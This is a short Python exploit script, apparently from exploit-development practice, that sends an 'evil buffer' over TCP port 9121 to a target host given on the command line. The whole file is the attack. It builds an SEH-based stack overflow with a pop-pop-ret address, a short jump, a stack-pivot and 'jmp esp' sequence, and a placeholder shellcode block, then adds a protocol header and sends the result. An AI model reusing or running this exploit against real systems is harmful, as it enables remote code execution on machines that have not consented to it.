#!/usr/bin/python
import socket
import sys
from struct import pack
try:
	server = sys.argv[1]
	print(server)
	port = 9121
	size = 1000
	shellcode = b"\x90" * 8 # padding (not necessary)
	shellcode = b"\x43" * (400 - len(shellcode)) # actual shellcode
	inputBuffer = b"\x41" * 124
	inputBuffer += pack("<L", (0x06eb9090))
	inputBuffer += pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	inputBuffer += b"\x90\x90"	# padding
	inputBuffer += b"\x66\x81\xC4\x7C\x08" 	# add sp, 0x87c
	inputBuffer += b"\xff\xe4"		# jmp esp
	inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
	
	inputBuffer += shellcode
	
	header = b"\x75\x19\xba\xab"
	header += b"\x03\x00\x00\x00"
	header += b"\x00\x40\x00\x00"
	header += pack('<I', len(inputBuffer))
	header += pack('<I', len(inputBuffer))
	header += pack('<I', inputBuffer[-1])
	buf = header + inputBuffer
	print("Sending evil buffer...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
	s.send(buf)
	s.close()

	print("Done!")
except socket.error:
	print("Could not connect!")
